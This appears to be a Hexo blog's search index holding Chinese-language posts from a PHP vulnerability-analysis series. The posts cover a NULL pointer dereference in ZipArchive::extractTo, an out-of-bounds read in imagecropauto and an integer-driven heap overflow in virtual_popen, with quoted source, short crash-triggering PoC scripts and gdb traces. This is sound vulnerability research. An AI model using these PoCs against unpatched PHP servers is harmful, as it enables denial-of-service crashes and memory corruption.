<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[HTML5沙盒绕过(翻译)]]></title>
      <url>http://yoursite.com/2017/03/07/HTML5%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>可以移步到看雪论坛观赏，地址 <a href="http://bbs.pediy.com/thread-216185.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216185.htm</a><br>有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[汽车黑客手册(翻译)by hackyzh]]></title>
      <url>http://yoursite.com/2017/03/05/%E6%B1%BD%E8%BD%A6%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>由于markdown不太好排版，所以只好放在word文档里面，翻译这些文章，只是兴趣使然，没有别的意思。由于英文水平有限，麻烦看到错误请指出谢谢！后面可能会继续翻译下去。</p>
<p>第一章地址：<a href="https://github.com/whiteHat001/Car-Hacker-s-Handbook--" target="_blank" rel="external">https://github.com/whiteHat001/Car-Hacker-s-Handbook--</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[NULL Pointer Dereference]]></title>
      <url>http://yoursite.com/2017/02/19/NULL-Pointer-Dereference/</url>
      <content type="html"><![CDATA[<h1 id="NULL-pointer-dereference-php漏洞挖掘系列四"><a href="#NULL-pointer-dereference-php漏洞挖掘系列四" class="headerlink" title="NULL pointer dereference (php漏洞挖掘系列四)"></a>NULL pointer dereference (php漏洞挖掘系列四)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本次要讲的是空指针漏洞，php官方把空指针漏洞算安全漏洞，有些空指针漏洞会申报cve的，不过我也不太清楚它将哪些空指针漏洞上报cve，好了开始分享本次漏洞吧，这个漏洞案例有些地方我也不是很清楚，那个上报漏洞人有些地方讲解的地方不是很清楚，我自己水平有限，欢迎清楚的朋友指点指点。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放顶层函数代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">static ZIPARCHIVE_METHOD(extractTo)</div><div class="line">&#123;</div><div class="line">	struct zip *intern;</div><div class="line"></div><div class="line">	zval *self = getThis();</div><div class="line">	zval *zval_files = NULL;</div><div class="line">	zval *zval_file = NULL;</div><div class="line">	php_stream_statbuf ssb;</div><div class="line">	char *pathto;</div><div class="line">	size_t pathto_len;</div><div class="line">	int ret, i;</div><div class="line"></div><div class="line">	int nelems;</div><div class="line"></div><div class="line">	if (!self) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;s|z&quot;, &amp;pathto, &amp;pathto_len, &amp;zval_files) == FAILURE) &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (pathto_len &lt; 1) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (php_stream_stat_path_ex(pathto, PHP_STREAM_URL_STAT_QUIET, &amp;ssb, NULL) &lt; 0) &#123;</div><div class="line">			ret = php_stream_mkdir(pathto, 0777,  PHP_STREAM_MKDIR_RECURSIVE, NULL);</div><div class="line">			if (!ret) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	ZIP_FROM_OBJECT(intern, self);</div><div class="line">	if (zval_files &amp;&amp; (Z_TYPE_P(zval_files) != IS_NULL)) &#123;</div><div class="line">		switch (Z_TYPE_P(zval_files)) &#123;</div><div class="line">			case IS_STRING:</div><div class="line">				if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_files), Z_STRLEN_P(zval_files))) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_ARRAY:</div><div class="line">				nelems = zend_hash_num_elements(Z_ARRVAL_P(zval_files));</div><div class="line">				if (nelems == 0 ) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				for (i = 0; i &lt; nelems; i++) &#123;</div><div class="line">					if ((zval_file = zend_hash_index_find(Z_ARRVAL_P(zval_files), i)) != NULL) &#123;</div><div class="line">						switch (Z_TYPE_P(zval_file)) &#123;</div><div class="line">							case IS_LONG:</div><div class="line">								break;</div><div class="line">							case IS_STRING:</div><div class="line">								if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_file), Z_STRLEN_P(zval_file))) &#123;</div><div class="line">									RETURN_FALSE;</div><div class="line">								&#125;</div><div class="line">								break;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_LONG:</div><div class="line">			default:</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Invalid argument, expect string or array of strings&quot;);</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125; else &#123;</div><div class="line">		/* Extract all files */</div><div class="line">		int filecount = zip_get_num_files(intern);</div><div class="line"></div><div class="line">		if (filecount == -1) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Illegal archive&quot;);</div><div class="line">				RETURN_FALSE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		for (i = 0; i &lt; filecount; i++) &#123;</div><div class="line">			char *file = (char*)zip_get_name(intern, i, ZIP_FL_UNCHANGED);</div><div class="line">			if (!php_zip_extract_file(intern, pathto, file, strlen(file))) &#123;    //这里跟踪进去就行了。</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	RETURN_TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里上面有个判断语句，是else调用了这个函数，可以用gdb自己调试一下，就会知道是在哪里调用了。<br>下面这个函数我就不放完整代码了，就放关键的地方吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">static int php_zip_extract_file(struct zip * za, char *dest, char *file, int file_len)</div><div class="line">&#123;</div><div class="line">	php_stream_statbuf ssb;</div><div class="line">	struct zip_file *zf;</div><div class="line">	struct zip_stat sb;</div><div class="line">	char b[8192];</div><div class="line">	int n, len, ret;</div><div class="line">	php_stream *stream;</div><div class="line">	char *fullpath;</div><div class="line">	char *file_dirname_fullpath;</div><div class="line">	char file_dirname[MAXPATHLEN];</div><div class="line">	size_t dir_len;</div><div class="line">	int is_dir_only = 0;</div><div class="line">	char *path_cleaned;</div><div class="line">	size_t path_cleaned_len;</div><div class="line">	cwd_state new_state;</div><div class="line">	zend_string *file_basename;</div><div class="line"></div><div class="line">	new_state.cwd = CWD_STATE_ALLOC(1);</div><div class="line">	new_state.cwd[0] = &apos;\0&apos;;</div><div class="line">	new_state.cwd_length = 0;</div><div class="line"></div><div class="line">	/* Clean/normlize the path and then transform any path (absolute or relative)</div><div class="line">		 to a path relative to cwd (../../mydir/foo.txt &gt; mydir/foo.txt)</div><div class="line">	 */</div><div class="line">	virtual_file_ex(&amp;new_state, file, NULL, CWD_EXPAND);</div></pre></td></tr></table></figure></p>
<p>下面就是最底层引用空指针的地方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CWD_API int virtual_file_ex(cwd_state *state, const char *path, verify_path_func verify_path, int use_realpath) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int path_length = (int)strlen(path); //这里就造成了段错误。</div></pre></td></tr></table></figure></p>
<p>poc我放不放都无所，参考文章里有，我想说下面的三个函数缺一不可，有可能哪个地方对传入的文件做了检查，不过我没找，所以整个完整的详细过程我也不是很清楚。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$zip = new ZipArchive();</div><div class="line">$zip-&gt;open(&quot;/opt/test.php&quot;,ZIPARCHIVE::CREATE);</div><div class="line">var_dump($zip-&gt;addEmptyDir(&quot;fosadsao&quot;));</div><div class="line">$zip-&gt;extractTo(&quot;sdsadsa&quot;);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">106	../sysdeps/x86_64/strlen.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">#1  0x000000000084c598 in virtual_file_ex (state=state@entry=0x7fffffff7b90, </div><div class="line">    path=path@entry=0x0, verify_path=verify_path@entry=0x0, </div><div class="line">    use_realpath=use_realpath@entry=0) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1179</div><div class="line">#2  0x0000000000779595 in php_zip_extract_file (za=za@entry=0x10aecf0, </div><div class="line">    dest=0x7ffff1662498 &quot;sdsadsa&quot;, file=0x0, file_len=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/ext/zip/php_zip.c:161</div><div class="line">#3  0x0000000000779ae1 in c_ziparchive_extractTo (execute_data=&lt;optimized out&gt;, </div><div class="line">    return_value=0x7ffff1613100) at /root/php-7.0.2/ext/zip/php_zip.c:2671</div><div class="line">#4  0x00000000008a1574 in ZEND_DO_FCALL_SPEC_HANDLER ()</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:842</div><div class="line">#5  0x000000000085decb in execute_ex (ex=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:414</div><div class="line">#6  0x00000000008aed09 in zend_execute (op_array=&lt;optimized out&gt;, </div><div class="line">    return_value=&lt;optimized out&gt;) at /root/php-7.0.2/Zend/zend_vm_execute.h:458</div><div class="line">#7  0x000000000081e477 in zend_execute_scripts (type=type@entry=8, </div><div class="line">    retval=retval@entry=0x0, file_count=file_count@entry=3)</div><div class="line">    at /root/php-7.0.2/Zend/zend.c:1427</div><div class="line">#8  0x00000000007b2960 in php_execute_script (</div><div class="line">    primary_file=primary_file@entry=0x7fffffffd290) at /root/php-7.0.2/main/main.c:2471</div><div class="line">#9  0x00000000008b0b73 in do_cli (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:974</div><div class="line">#10 0x0000000000441480 in main (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:1345</div></pre></td></tr></table></figure>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这次的分享是一次失败的分享，主要是水平有限吧，期待高手来详细解释一下。后面可能会陆续放出double free和UAF的案例，不过关于php的垃圾回收机制我还不太了解，所以UAF的漏洞估计会要很久，不过网上已经有人分析，我如果要将的话也只能选另外一个cve讲讲，原理大致都差不多的，毕竟用C写的。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=71561" target="_blank" rel="external">https://bugs.php.net/bug.php?id=71561</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Out of bounds access]]></title>
      <url>http://yoursite.com/2017/02/18/Out-of-bounds-access/</url>
      <content type="html"><![CDATA[<h1 id="Out-of-bounds-php漏洞挖掘系列三"><a href="#Out-of-bounds-php漏洞挖掘系列三" class="headerlink" title="Out of bounds (php漏洞挖掘系列三)"></a>Out of bounds (php漏洞挖掘系列三)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，哈哈。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>不过说废话，直接上函数代码。这次我们逆向思维分析，不是逆向工程那个逆向哈。</p>
<p>看到下面的这段代码没，这里如果不是真彩色的话，就调用后面(im)-&gt;red[(c)，所以等会创建颜色的时候要注意。这里的颜色最大值为256。这里我就不放代码了，自己搜索吧，在gdImagePtrzh这个类型的结构体里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define gdImageRed(im, c) ((im)-&gt;trueColor ? gdTrueColorGetRed(c) : \</div><div class="line">	(im)-&gt;red[(c)])</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static int gdColorMatch(gdImagePtr im, int col1, int col2, float threshold)</div><div class="line">&#123;</div><div class="line">	const int dr = gdImageRed(im, col1) - gdImageRed(im, col2); //这里往下都造成了数组越界的问题。</div><div class="line">	const int dg = gdImageGreen(im, col1) - gdImageGreen(im, col2);  </div><div class="line">	const int db = gdImageBlue(im, col1) - gdImageBlue(im, col2);</div><div class="line">	const int da = gdImageAlpha(im, col1) - gdImageAlpha(im, col2);</div><div class="line">	const double dist = sqrt(dr * dr + dg * dg + db * db + da * da);</div><div class="line">	const double dist_perc = sqrt(dist / (255^2 + 255^2 + 255^2));</div><div class="line">	return (dist_perc &lt;= threshold);</div><div class="line">	//return (100.0 * dist / 195075) &lt; threshold;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后网上搜索，调用这个函数的如果检查不到位的话都会触发漏洞，然后下面这个函数调用了gdColorMatach。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)</div><div class="line">&#123;</div><div class="line">	const int width = gdImageSX(im);</div><div class="line">	const int height = gdImageSY(im);</div><div class="line"></div><div class="line">	int x,y;</div><div class="line">	int match;</div><div class="line">	gdRect crop;</div><div class="line"></div><div class="line">	crop.x = 0;</div><div class="line">	crop.y = 0;</div><div class="line">	crop.width = 0;</div><div class="line">	crop.height = 0;</div><div class="line"></div><div class="line">	/* Pierre: crop everything sounds bad */</div><div class="line">	if (threshold &gt; 1.0) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	/* TODO: Add gdImageGetRowPtr and works with ptr at the row level</div><div class="line">	 * for the true color and palette images</div><div class="line">	 * new formats will simply work with ptr</div><div class="line">	 */</div><div class="line">	match = 1;</div><div class="line">	for (y = 0; match &amp;&amp; y &lt; height; y++) &#123;</div><div class="line">		for (x = 0; match &amp;&amp; x &lt; width; x++) &#123;</div><div class="line">			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) &gt; 0;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>然后再搜索哪个函数调用了这个代码，最终定位到顶层函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecropauto)</div><div class="line">&#123;</div><div class="line">	zval *IM;</div><div class="line">	zend_long mode = -1;</div><div class="line">	zend_long color = -1;</div><div class="line">	double threshold = 0.5f;</div><div class="line">	gdImagePtr im;</div><div class="line">	gdImagePtr im_crop;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;r|ldl&quot;, &amp;IM, &amp;mode, &amp;threshold, &amp;color) == FAILURE)  &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if ((im = (gdImagePtr)zend_fetch_resource(Z_RES_P(IM), &quot;Image&quot;, le_gd)) == NULL) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	switch (mode) &#123;</div><div class="line">		case -1:</div><div class="line">			mode = GD_CROP_DEFAULT;</div><div class="line">		case GD_CROP_DEFAULT:</div><div class="line">		case GD_CROP_TRANSPARENT:</div><div class="line">		case GD_CROP_BLACK:</div><div class="line">		case GD_CROP_WHITE:</div><div class="line">		case GD_CROP_SIDES:</div><div class="line">			im_crop = gdImageCropAuto(im, mode);</div><div class="line">			break;</div><div class="line"></div><div class="line">		case GD_CROP_THRESHOLD:</div><div class="line">			if (color &lt; 0) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Color argument missing with threshold mode&quot;);  //这里做了检查然后没啥卵用。</div><div class="line">				RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">			im_crop = gdImageCropThreshold(im, color, (float) threshold);  //这里调用了这个函数</div><div class="line">			break;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$image=imagecreate(1000,1020);</div><div class="line">var_dump(imagecropauto($image,IMG_CROP_THRESHOLD,1,8888888));</div></pre></td></tr></table></figure>
<p>我发现了一个奇怪的问题就是，color的数值小一点就会报错，看函数也没调用overflow这个区做安全检查，不知道是哪里出问题了。调试信息放不放都无所谓了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>本来想找个有趣的数组越界的问题，我记忆中中sqrt函数造成的问题，传进去负数之后会颠倒位置，就造成了最后的结果过大造成数组越界，最终找来找去还是没找到。只能用这个函数做案例了。终于要到驾照上课去了，这边文章就写到这里吧，有问题欢迎指出。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=72494" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72494</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Heap-based buffer overflow]]></title>
      <url>http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Heap-based-integer-overflow-php漏洞挖掘系列之二"><a href="#Heap-based-integer-overflow-php漏洞挖掘系列之二" class="headerlink" title="Heap-based integer overflow(php漏洞挖掘系列之二)"></a>Heap-based integer overflow(php漏洞挖掘系列之二)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix环境使用的函数。然而没啥卵用。这个函数是执行命令的底层调用函数，具体我就不往上找了麻烦，从代码中就可以大致看的出来。php执行命令的函数还是挺多的，我就不列举了，在poc中我用的是system函数。然后就进入漏洞分析环节了。请看代码注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#else /* Unix */</div><div class="line">CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int command_length;  //int型的长度在32位中为0x7fffffff</div><div class="line">	int dir_length, extra = 0;</div><div class="line">	char *command_line;</div><div class="line">	char *ptr, *dir;</div><div class="line">	FILE *retval;</div><div class="line"></div><div class="line">	command_length = strlen(command);  //这里统计命令的字符串长度，</div><div class="line"></div><div class="line">	dir_length = CWDG(cwd).cwd_length; </div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line">	while (dir_length &gt; 0) &#123;</div><div class="line">		if (*dir == &apos;\&apos;&apos;) extra+=3;</div><div class="line">		dir++;</div><div class="line">		dir_length--;</div><div class="line">	&#125;</div><div class="line">	dir_length = CWDG(cwd).cwd_length;//脚本路径的长度</div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line"></div><div class="line">	ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);  //这边变成了emalloc(0)，等会看调试信息</div><div class="line">	if (!command_line) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	memcpy(ptr, &quot;cd &quot;, sizeof(&quot;cd &quot;)-1);</div><div class="line">	ptr += sizeof(&quot;cd &quot;)-1;</div><div class="line"></div><div class="line">	if (CWDG(cwd).cwd_length == 0) &#123;</div><div class="line">		*ptr++ = DEFAULT_SLASH;</div><div class="line">	&#125; else &#123;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">		while (dir_length &gt; 0) &#123;</div><div class="line">			switch (*dir) &#123;</div><div class="line">			case &apos;\&apos;&apos;:</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				*ptr++ = &apos;\\&apos;;</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				/* fall-through */</div><div class="line">			default:</div><div class="line">				*ptr++ = *dir;</div><div class="line">			&#125;</div><div class="line">			dir++;</div><div class="line">			dir_length--;</div><div class="line">		&#125;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line">	*ptr++ = &apos;;&apos;;</div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line"></div><div class="line">	memcpy(ptr, command, command_length+1);  //这里command_length+1=0xfffffff1 大于申请的堆空间，所以复制后造成溢出</div><div class="line">	retval = popen(command_line, type);</div><div class="line"></div><div class="line">	efree(command_line);</div><div class="line">	return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>gdb调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php </div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) b zend_virtual_cwd.c:1873</div><div class="line">Breakpoint 1 at 0x84d8b4: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1873.</div><div class="line">(gdb) b zend_virtual_cwd.c:1904</div><div class="line">Breakpoint 2 at 0x84d979: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1904.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"></div><div class="line">Breakpoint 1, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1873</div><div class="line">1873		ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);</div><div class="line">(gdb) p command_length</div><div class="line">$1 = -16</div><div class="line">(gdb) p sizeof(&quot;cd &apos;&apos; ; &quot;)</div><div class="line">$2 = 9</div><div class="line">(gdb) p dir_length</div><div class="line">$3 = 5</div><div class="line">(gdb) p extra</div><div class="line">$4 = 0    //可以看到这边加起来为0，其实这样比较容易理解。</div><div class="line"></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., 